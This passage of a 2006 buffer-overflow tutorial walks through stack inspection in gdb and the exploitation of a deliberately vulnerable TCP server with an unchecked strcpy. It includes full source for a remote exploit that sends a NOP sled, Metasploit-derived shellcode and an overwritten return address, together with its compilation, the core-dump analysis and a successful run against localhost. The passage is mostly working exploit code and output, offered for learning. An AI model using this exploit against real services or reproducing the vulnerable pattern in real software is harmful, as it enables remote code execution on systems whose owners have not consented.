0xbfffed34:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffed3c:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffed44:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x69
0xbfffed4c:     0x36    0x38    0x36    0x00    0x00    0x00    0x00    0x00
0xbfffed54:     0x00    0x00    0x00    0x00    0x00    0x00    0x2e    0x2f
0xbfffed5c:     0x76    0x75    0x6c    0x6e    0x65    0x72    0x61    0x62
0xbfffed64:     0x6c    0x65    0x00    0x90    0x90    0x90    0x90    0x90
0xbfffed6c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffed74:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffed7c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffed84:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffed8c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffed94:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffed9c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffeda4:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffedac:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffedb4:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffedbc:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffedc4:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffedcc:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffedd4:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffeddc:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffede4:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffedec:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffedf4:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffedfc:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffee04:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffee0c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffee14:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffee1c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffee24:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffee2c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x2b
0xbfffee34:     0xc9    0x83    0xe9    0xf5    0xd9    0xee    0xd9    0x74
0xbfffee3c:     0x24    0xf4    0x5b    0x81    0x73    0x13    0x64    0x96
0xbfffee44:     0x2c    0xed    0x83    0xeb    0xfc    0xe2    0xf4    0x0e
0xbfffee4c:     0x9d    0x74    0x74    0x36    0xf0    0x44    0xc0    0x07
0xbfffee54:     0x1f    0xcb    0x85    0x4b    0xe5    0x44    0xed    0x0c
(gdb)
---------------------------------------------------------------------------------------------
Using the &quot;x/1000xb $esp&quot; command we can inspect the data the memory register ESP holds.

&quot;But dude that&#039;s like a thousand OPCODEs in there!!!&quot;
Close, 992 to be exact, increasing &quot;1000&quot; will get you more results.
And what&#039;s your problem? Just pick an address that points to our NOP-sled and you&#039;re good to go!
The address &quot;0xbfffedac&quot; would do just fine, but remember,
you must first convert it to little-endian.

conversion:
---------------------------------------------------------------------------------------------
(big-endian) --&gt; (little-endian and ready to use in our script)
  0xbfffedac --&gt; \xac\xed\xff\xbf
---------------------------------------------------------------------------------------------
&quot;Oh, ok thanks.&quot;
No worries. :)

OK, I think you got how it works.
Now that we wrote a basic buffer overflow exploit
it&#039;s time for TCP/IP server exploitation, hehehe...


[ 0x0f ] Vulnerable TCP/IP server &amp; Exploit code
=================================================
I take for granted that you understood all the above,at an acceptable level at least .
If you don&#039;t have any experience in network programming it&#039;s not going to be a problem
as the coments in the network code will tell you what&#039;s happening.

We will use a basic, and vulnerable, TCP/IP server as our target.

*********************************************************************************************
/*
  Author: Zapotek

  Description:
  Vulnerable TCP/IP server for use with
  the &quot;Buffer Overflows, a peek under the hood.&quot; paper.
*/

#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;signal.h&gt;

#define LPORT 1337    // listen on port
#define CONNUM 10     // queue up to 10 connections
#define MAXDATA 1024 // max amount of data received at once 

// our vulnerable function
int handleR(char *in){
char hazard[256]; // our exploitable buffer

strcpy(hazard,in); // the mother of all evil

printf(&quot;\nClient sent: %s&quot;,hazard);
return 0;
}

int main(void)
{
    int sockfd, newfd;  // listen on sock_fd, new connection on newfd
    struct sockaddr_in my_addr;    // my address information
    struct sockaddr_in their_addr; // connector&#039;s address information
    socklen_t sin_size;
    struct sigaction sa;
    int yes=1;
    char in[1024];
    char hazard[100];
    int numbytes;

    // Basic error checking
    if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
        perror(&quot;socket&quot;);
        exit(1);
    }
    // Basic error checking
    if (setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&amp;yes,sizeof(int)) == -1) {
        perror(&quot;setsockopt&quot;);
        exit(1);
    }

    my_addr.sin_family = AF_INET;         // host byte order
    my_addr.sin_port = htons(LPORT);     // short, network byte order
    my_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP
    memset(&amp;(my_addr.sin_zero), &#039;\0&#039;, 8); // zero the rest of the struct

    // bind socket using info from &quot;sockaddr&quot;
    // and do some error checking
    if (bind(sockfd, (struct sockaddr *)&amp;my_addr, sizeof(struct sockaddr)) == -1) {
        perror(&quot;bind&quot;);
        exit(1);
    }

    // listen on LPORT and hold up to CONNUM connections
    // and do some error checking
    if (listen(sockfd, CONNUM) == -1) {
        perror(&quot;listen&quot;);
        exit(1);
    }

    while(1) {  // main accept() loop
        sin_size = sizeof(struct sockaddr_in);

        // get new socket file descriptor for connector-server interaction
	// and do some error checking
	if ((newfd = accept(sockfd, (struct sockaddr *)&amp;their_addr,
                                                       &amp;sin_size)) == -1) {
            perror(&quot;accept&quot;);
            continue;
        }

        printf(&quot;server: got connection from %s&quot;,inet_ntoa(their_addr.sin_addr));

	    // get tcp/ip packet from client
            if ((numbytes=recv(newfd, in, MAXDATA-1, 0)) == -1) {
                perror(&quot;recv&quot;);
                exit(1);
            }

	// call the vulnerable function to handle tcp/ip input data
	handleR(in);
    }

    return 0;
}

*********************************************************************************************

Basic math:
---------------------------------------------------------------------------------------------
**********************************************
char hazard[256]; // our exploitable buffer
**********************************************

Exploitable buffer = 256 bytes

**********************************************
/* a memory address pointing somewhere in our NOP-sled which will overwrite 
   the EIP register  */
char *eip = &quot;AAAA&quot;;
***********************************************

Payload (that overwrites EIP) = Exploitable buffer + EIP = 256 + 4 = 260 bytes

***********************************************************
/*
   Shellcode taken from the metasploit project
   It executes the &quot;ls -l&quot; UNIX command on the vulnerable system
*/
/* linux_ia32_exec -  CMD=ls -l Size=68 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char scode[] =
&quot;\x33\xc9\x83\xe9\xf5\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf0&quot;
&quot;\x49\x9b\x89\x83\xeb\xfc\xe2\xf4\x9a\x42\xc3\x10\xa2\x2f\xf3\xa4&quot;
&quot;\x93\xc0\x7c\xe1\xdf\x3a\xf3\x89\x98\x66\xf9\xe0\x9e\xc0\x78\xdb&quot;
&quot;\x18\x4f\x9b\x89\xf0\x25\xe8\xa9\xdd\x25\x9b\xde\xa3\xc0\x7a\x44&quot;
&quot;\x70\x49\x9b\x89&quot;;
***********************************************************

Shellcode = 68 bytes
NOP-sled = Payload - Shellcode = 260 - 68 = 192 bytes
---------------------------------------------------------------------------------------------

So we have a dummy RET address which will overwrite EIP
and which we will change once we complete the exploit.

We&#039;re set!
We&#039;ll just use the bellow C code to construct our payload.

Construct payload:
*********************************************************************************************
/* construct payload */
memset(payload,NOP,192); // put 192 bytes of nopsled first
memcpy(payload+192,scode,sizeof(scode)); // the shellcode in the midle
memcpy(payload+192+sizeof(scode)-1,eip,sizeof(eip)); // and the eip address at the end

*********************************************************************************************

All the above code segments are taken from our exploit.

sploit.c:
*********************************************************************************************
/*
  Author: zapotek
  Usage: ./sploit.bin &lt;target_ip&gt;
  
  Description:
  Exploit for use with
  the &quot;Buffer Overflows, a peek under the hood.&quot; paper.
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;netinet/in.h&gt;

#define RPORT      1337
#define NOP        0x90

int main(int argc,char *argv[]){

int sockfd; // socket file descriptor
struct sockaddr_in target_addr; // assign struct sockadd_in to target_addr
char payload[272]; // set payload to hold 272 bytes

printf(&quot;[ * ] Creating socket...&quot;);

/* create socket and do error checking */
if((sockfd = socket(AF_INET,SOCK_STREAM,0)) == -1){
	perror(&quot;socket&quot;);
	exit(1);
}
printf(&quot; OK\n&quot;);

/* a memory address pointing somewhere in our NOP-sled which will overwrite 
   the EIP register  */
char *eip = &quot;AAAA&quot;;

/*
   Shellcode taken from the metasploit project
   It executes the &quot;ls -l&quot; UNIX command on the vulnerable system
*/
/* linux_ia32_exec -  CMD=ls -l Size=68 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char scode[] =
&quot;\x33\xc9\x83\xe9\xf5\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf0&quot;
&quot;\x49\x9b\x89\x83\xeb\xfc\xe2\xf4\x9a\x42\xc3\x10\xa2\x2f\xf3\xa4&quot;
&quot;\x93\xc0\x7c\xe1\xdf\x3a\xf3\x89\x98\x66\xf9\xe0\x9e\xc0\x78\xdb&quot;
&quot;\x18\x4f\x9b\x89\xf0\x25\xe8\xa9\xdd\x25\x9b\xde\xa3\xc0\x7a\x44&quot;
&quot;\x70\x49\x9b\x89&quot;;

printf(&quot;[ * ] Constructing payload...&quot;);

/* construct payload */
memset(payload,NOP,192); // put 192 bytes of nopsled first
memcpy(payload+192,scode,sizeof(scode)); // the shellcode in the midle
memcpy(payload+192+sizeof(scode)-1,eip,sizeof(eip)); // and the eip address at the end

printf(&quot; OK [%i bytes]\n&quot;,sizeof(payload));

/* connection information */
target_addr.sin_family = AF_INET; // set address familly
target_addr.sin_addr.s_addr = inet_addr(argv[1]); // set target&#039;s IP addrss, our one and only arguement
target_addr.sin_port = htons(RPORT); // the remote port

printf(&quot;[ * ] Connecting to target...&quot;);
/* connect to target and error check */
if((connect(sockfd, (struct sockaddr_in *)&amp;target_addr,sizeof(target_addr))) == -1){
	perror(&quot;connect&quot;);
	exit(1);
}
printf(&quot; OK [%s]\n&quot;,argv[1]);

printf(&quot;[ * ] Sending payload to target...&quot;);
/* send paylod to the vuln server and do error checking */
if(send(sockfd,payload,strlen(payload),0) == -1 ){
	perror(&quot;send&quot;);
	exit(1);
}
printf(&quot; OK [ls -l]\n&quot;);

/* inform user of payload size and status */
printf(&quot;[ * ] It&#039;s all yours now, I&#039;m out.\n&quot;);

exit(0);
}

*********************************************************************************************

Lets setup our test environment, shell we?

Setup:
---------------------------------------------------------------------------------------------
lil-z:/home/zapotek/Documents/bo # gcc vuln.c -o vuln.bin &amp;&amp; gcc sploit.c -o sploit.bin
vuln.c: In function â..handleRâ..:
vuln.c:30: warning: incompatible implicit declaration of built-in function â..printfâ..
vuln.c: In function â..mainâ..:
vuln.c:87: warning: incompatible implicit declaration of built-in function â..printfâ..
sploit.c: In function â..mainâ..:
sploit.c:67: warning: passing argument 2 of â..connectâ.. from incompatible pointer type
lil-z:/home/zapotek/Documents/bo # ./vuln.bin

---------------------------------------------------------------------------------------------

And hit return, the TCP/IP server should now be listening to port &quot;1337&quot;
on the ip address &quot;127.0.0.1&quot;, if run locally.
Now open another terminal, in the same directory, and:
---------------------------------------------------------------------------------------------
zapotek@lil-z:~/Documents/bo&gt; ./sploit.bin 127.0.0.1
[ * ] Creating socket... OK
[ * ] Constructing payload... OK [272 bytes]
[ * ] Connecting to target... OK [127.0.0.1]
[ * ] Sending payload to target... OK [ls -l]
[ * ] It&#039;s all yours now, I&#039;m out.
zapotek@lil-z:~/Documents/bo&gt;
---------------------------------------------------------------------------------------------

while on the terminal that the server runs you should see:
---------------------------------------------------------------------------------------------
lil-z:/home/zapotek/Documents/bo # ./vuln.bin
server: got connection from 127.0.0.1
Segmentation fault (core dumped)
lil-z:/home/zapotek/Documents/bo #
---------------------------------------------------------------------------------------------

It&#039;s time we examine the dumped core:
---------------------------------------------------------------------------------------------
lil-z:/home/zapotek/Documents/bo # gdb -c core
GNU gdb 6.4
Copyright 2005 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type &quot;show copying&quot; to see the conditions.
There is absolutely no warranty for GDB.  Type &quot;show warranty&quot; for details.
This GDB was configured as &quot;i586-suse-linux&quot;.
(no debugging symbols found)
Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.
Core was generated by `./vuln.bin&#039;.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) i r eip
eip            0x41414141       0x41414141
(gdb) x/500xb $esp
0xbfffe810:     0xf4    0xbf    0xfb    0xb7    0xd4    0x9f    0xfb    0xb7
0xbfffe818:     0x02    0x64    0xff    0xb7    0xb0    0xf6    0xe9    0xb7
0xbfffe820:     0x00    0x00    0x00    0x00    0x96    0x14    0xeb    0xb7
0xbfffe828:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffe830:     0x64    0x56    0xfe    0xb7    0x02    0x00    0x00    0xb8
0xbfffe838:     0x03    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffe840:     0x54    0xe8    0xff    0xbf    0xf4    0x0f    0x00    0xb8
0xbfffe848:     0x80    0x18    0x00    0xb8    0xdc    0xe8    0xff    0xbf
0xbfffe850:     0xf0    0xe8    0xff    0xbf    0x87    0xf5    0xfe    0xb7
0xbfffe858:     0xdc    0xe8    0xff    0xbf    0x30    0x18    0x00    0xb8
0xbfffe860:     0x01    0x00    0x00    0x00    0x60    0x58    0xfe    0xb7
0xbfffe868:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffe870:     0x01    0x00    0x00    0x00    0x20    0x13    0x00    0xb8
0xbfffe878:     0x00    0x00    0x00    0x00    0xc8    0xe9    0xff    0xbf
0xbfffe880:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffe888:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffe890:     0xe8    0xe9    0xff    0xbf    0x90    0x90    0x90    0x90
0xbfffe898:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe8a0:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe8a8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe8b0:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe8b8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe8c0:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe8c8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe8d0:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe8d8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe8e0:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe8e8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe8f0:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe8f8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe900:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe908:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe910:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe918:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe920:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe928:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe930:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe938:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe940:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe948:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfffe950:     0x90    0x90    0x90    0x90    0x33    0xc9    0x83    0xe9
0xbfffe958:     0xf5    0xd9    0xee    0xd9    0x74    0x24    0xf4    0x5b
0xbfffe960:     0x81    0x73    0x13    0xf0    0x49    0x9b    0x89    0x83
0xbfffe968:     0xeb    0xfc    0xe2    0xf4    0x9a    0x42    0xc3    0x10
0xbfffe970:     0xa2    0x2f    0xf3    0xa4    0x93    0xc0    0x7c    0xe1
0xbfffe978:     0xdf    0x3a    0xf3    0x89    0x98    0x66    0xf9    0xe0
0xbfffe980:     0x9e    0xc0    0x78    0xdb    0x18    0x4f    0x9b    0x89
0xbfffe988:     0xf0    0x25    0xe8    0xa9    0xdd    0x25    0x9b    0xde
0xbfffe990:     0xa3    0xc0    0x7a    0x44    0x70    0x49    0x9b    0x89
0xbfffe998:     0x41    0x41    0x41    0x41    0xf4    0xbf    0xfb    0xb7
0xbfffe9a0:     0xd4    0x9f    0xfb    0xb7    0x02    0x64    0xff    0xb7
0xbfffe9a8:     0xb0    0xf6    0xe9    0xb7    0x00    0x00    0x00    0x00
0xbfffe9b0:     0x01    0x00    0x00    0x00    0xec    0xe9    0xff    0xbf
0xbfffe9b8:     0xf0    0xe9    0xff    0xbf    0x10    0x10    0x00    0xb8
0xbfffe9c0:     0x20    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffe9c8:     0xbb    0xcc    0xff    0xb7    0x5a    0xcd    0xff    0xb7
0xbfffe9d0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffe9d8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffe9e0:     0x00    0x00    0x00    0x00    0xcc    0x58    0xfe    0xb7
0xbfffe9e8:     0xa2    0xea    0xfe    0xb7    0x00    0x00    0xfc    0xb7
0xbfffe9f0:     0x70    0x48    0x02    0x00    0xf4    0x0f    0x00    0xb8
0xbfffe9f8:     0x70    0xed    0xff    0xbf    0x0f    0xa2    0xfe    0xb7
0xbfffea00:     0x20    0x13    0x00    0xb8
(gdb)
---------------------------------------------------------------------------------------------

Nice, EIP has been set to hold &quot;41414141&quot;(=&quot;AAAA&quot;), which was exactly what we told it to hold,
and our NOP-sled is in place. :)

Now let&#039;s pick an address pointing somewhere in the NOP-sled, say &quot;0xbfffe8e8&quot;.
Converted will be &quot;\xe8\xe8\xff\xbf&quot;.

Now change this:
**********************************************
/* a memory address pointing somewhere in our NOP-sled which will overwrite 
   the EIP register  */
char *eip = &quot;AAAA&quot;;
***********************************************
to:
**********************************************
/* a memory address pointing somewhere in our NOP-sled which will overwrite 
   the EIP register  */
char *eip = &quot;\xe8\xe8\xff\xbf&quot;;
***********************************************
and:
---------------------------------------------------------------------------------------------
zapotek@lil-z:~/Documents/bo&gt; gcc sploit.c -o sploit.bin
sploit.c: In function â..mainâ..:
sploit.c:67: warning: passing argument 2 of â..connectâ.. from incompatible pointer type
zapotek@lil-z:~/Documents/bo&gt;
---------------------------------------------------------------------------------------------

That&#039;s pretty much it.
All you have to do know is rerun the TCP/IP server and the exploit:

Exploit Output:
---------------------------------------------------------------------------------------------
zapotek@lil-z:~/Documents/bo&gt; ./sploit.bin 127.0.0.1
[ * ] Creating socket... OK
[ * ] Constructing payload... OK [272 bytes]
[ * ] Connecting to target... OK [127.0.0.1]
[ * ] Sending payload to target... OK [ls -l]
[ * ] It&#039;s all yours now, I&#039;m out.
zapotek@lil-z:~/Documents/bo&gt;
---------------------------------------------------------------------------------------------

Server Output:
---------------------------------------------------------------------------------------------
lil-z:/home/zapotek/Documents/bo # ./vuln.bin
server: got connection from 127.0.0.1
total 11783
-rw-r--r-- 1 zapotek users    8721 Aug 24 17:11 Buffer Overflows, a peek under the hood.odt
-rw-r--r-- 1 zapotek users   38573 Aug 26 03:31 Buffer Overflows, a peek under the hood.txt
-rw------- 1 zapotek users  151552 Aug 26 03:36 core
-rwxr-xr-x 1 zapotek users  525173 Aug 25 18:14 shellcode
-rw-r--r-- 1 zapotek users      40 Aug 25 18:14 shellcode.c
-rw-r--r-- 1 root    root  5530086 Aug 25 18:20 shellcode.out
-rw-r--r-- 1 zapotek users    9575 Aug 25 20:44 shellcode.out2
-rwxr-xr-x 1 zapotek users    6602 Aug 25 20:43 shellcode2
-rw-r--r-- 1 zapotek users      40 Aug 25 20:43 shellcode2.c
-rw-r--r-- 1 zapotek users    1052 Aug 26 03:23 shellcode3
-rwxr-xr-x 1 zapotek users    8215 Aug 26 02:25 sploit.bin
-rw-r--r-- 1 zapotek users    2383 Aug 26 02:25 sploit.c
-rw-r--r-- 1 zapotek users     673 Aug 26 03:36 sploit.pl
-rw-r--r-- 1 zapotek users    1288 Aug 25 20:16 sploit1.c
-rw-r--r-- 1 zapotek users    9575 Aug 25 20:43 temp1
-rw-r--r-- 1 zapotek users     782 Aug 25 19:11 tenp_tzt
-rwxr-xr-x 1 zapotek users    6540 Aug 26 02:22 test
-rw-r--r-- 1 zapotek users     362 Aug 26 02:21 test.c
-rwxr-xr-x 1 zapotek users    6595 Aug 24 22:18 tmp.bin
-rw-r--r-- 1 zapotek users     455 Aug 24 23:41 tmp.c
-rwxr-xr-x 1 zapotek users    6694 Aug 24 23:31 tmp.vuln
-rw-r--r-- 1 zapotek users     780 Aug 25 20:29 tmpcode
-rw-r--r-- 1 zapotek users     796 Aug 25 20:30 tmpcode.c
-rwxr-xr-x 1 root    root     8283 Aug 23 23:50 vuln.bin
-rw-r--r-- 1 zapotek users    2256 Aug 23 23:53 vuln.c
-rwxr-xr-x 1 zapotek users    6701 Aug 26 03:08 vulnerable
-rw-r--r-- 1 zapotek users     455 Aug 26 03:07 vulnerable.c
lil-z:/home/zapotek/Documents/bo #
---------------------------------------------------------------------------------------------


[ 0x10 ] Epilogue
=================================================
Well, this paper came to an end and so did my ability to stay awake, 5:05am atm. :P
I hope I didn&#039;t bore you and that I helped you understand buffer overflows a bit more.
This was really fun, except from chapter &quot;[ 0x0e ] Buffer Overflow &amp; Exploit Examples&quot;.
Damn bash was screwing up my shellcode!!!

I don&#039;t like what I&#039;m about to say but I kinda have to.
---------------------------------------------------------------------------------------------
I don&#039;t hold any responsibility for your actions nor for any damages that may occur when
using the techniques or code presented here.
No warranty is provided for what is said here so, use the information contained in this paper
on you own risk!
---------------------------------------------------------------------------------------------

You can contact me at zapotekzsp[at]gmail.com, and please put the paper&#039;s title in the
subject of your e-mails otherwise I might miss them.

Any corrections, suggestions and clarifications are welcomed.

				##EOF##

# milw0rm.com [2006-08-26]
            </code></pre>

                    </div>

                    <div class="card-footer">

                        <div class="row">

                            <div class="col">

                                <strong>Tags:</strong>

                                
                            </div>

                            <div class="col">

                                
                                
                            </div>

                            <div class="col">

                                <span class="float-right">

                                    <strong>Advisory/Source:</strong>

                                    <a href="" target="_blank">
                                        Link
                                    </a>

                                </span>

                            </div>

                        </div>

                        <div class="row mt-3">

                            <div class="btn-group ml-2">

                                <a class="btn btn-primary btn-fab btn-icon btn-round"
                                   href="/papers/13163" aria-label="View Previous Paper"
                                   data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                    <i class="mdi mdi-arrow-left mdi-36px"></i>
                                </a>

                            </div>

                            <div class="col">

                                <div class="btn-group float-right">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/13165" aria-label="View Next Paper"
                                       data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                        <i class="mdi mdi-arrow-right mdi-36px"></i>
                                    </a>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                <div class="card">

                    <div class="card-footer">

    <div class="d-none d-lg-block">

        <div class="container-fluid">

            <table class="table table-borderless text-center">

                <thead style="background-color:#083257;">

                <tr class="text-white">
                        <th>
                            <strong>Downloads</strong>
                        </th>
                        <th>
                            <strong>Certifications</strong>
                        </th>
                        <th>
                            <strong>Training</strong>
                        </th>
                        <th>
                            <strong>Professional Services</strong>
                        </th>
                    </tr>

                </thead>

                <tbody>

                <tr class="text-center">
                    <td>
                        <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                            Kali Linux
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">OSCP
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/"
                           target="_blank" rel="noopener">Penetration Testing
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td>
                        <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                           target="_blank" rel="noopener">
                            Kali NetHunter
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">OSWP
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                           target="_blank" rel="noopener">Advanced Attack Simulation
                        </a>
                    </td>
                </tr>
                <tr>
                    <td>
                        <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                           target="_blank" rel="noopener">Kali Linux Revealed Book
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">OSEP
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#asa"
                           target="_blank" rel="noopener">Application Security Assessment
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">OSWE
                        </a>
                    </td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                           <br />Updated for 2020
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">OSED
                        </a>
                    </td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                           <br />All new for 2021
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://www.offensive-security.com/awe-osee/"
                           target="_blank" rel="noopener">OSEE
                        </a>
                    </td>
                    <td>
<!--
                        <a href="https://www.offensive-security.com/metasploit-unleashed/"
                           target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                        </a>
-->
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://kali.training/"
                           target="_blank" rel="noopener">KLCP
                        </a>
                    </td>
                    <td>
                        <a href="https://kali.training/courses/kali-linux-revealed/"
                           target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                        </a>
                    </td>
                    <td></td>
                </tr>

                </tbody>

            </table>

        </div>

    </div>

    <div class="d-lg-none text-center">

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownDownloads" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Downloads
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownDownloads">

                <a class="dropdown-item" href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                    Kali Linux
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                   target="_blank" rel="noopener">
                    Kali NetHunter
                </a>
                <a class="dropdown-item"
                   href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                   target="_blank" rel="noopener">
                    Kali Linux Revealed Book
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownCerts" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Certifications
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownCerts">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener">OSCP
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">OSWP
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">OSEP
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">OSWE
